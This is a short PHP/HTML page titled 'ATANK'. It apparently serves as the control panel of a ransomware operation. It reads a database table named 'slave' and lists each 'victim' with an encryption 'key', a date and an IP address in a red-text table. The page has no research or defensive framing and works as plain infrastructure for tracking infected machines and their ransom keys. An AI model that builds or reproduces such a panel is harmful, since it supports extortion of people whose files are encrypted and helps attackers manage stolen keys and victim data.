
<html lang="en" >
<?php
    include_once 'sql.php';
?>
<head>
  <meta charset="UTF-8">
  <title>ATANK</title>
  
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">

  <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Anton'>

      <link rel="stylesheet" href="css/style.css">

  
</head>

<body>
    
    <div class="camera_x">
  <div class="camera_y">
    <div class="triangle">
      <div class="triangle_outer clip"></div>
      <div class="triangle_inner clip"></div>
    </div>
  </div>
</div>

<div class="tr">
                <table border="1" width="100%">
                  <tr>
                    <th>victim</th>
                    <th>key</th>
                    <th>date</th>
                    <th>ip</th>
                  </tr>
                  <tr>
                      
                        <?php $sql = "SELECT id, rankey, date, ip FROM slave";
  $result = $conn->query($sql);
  if ($result->num_rows > 0) {
   // output data of each row
   while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . '<font color="red">' . $row["id"] . '</font>'. "</td><td>" . '<font color="red">' . $row["rankey"] .  '</font>'. "</td><td>" . '<font color="red">' . $row["date"] . '</font>'. "</td><td>" . '<font color="red">' . $row["ip"] . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>


  
  </div>

</body>

</html>
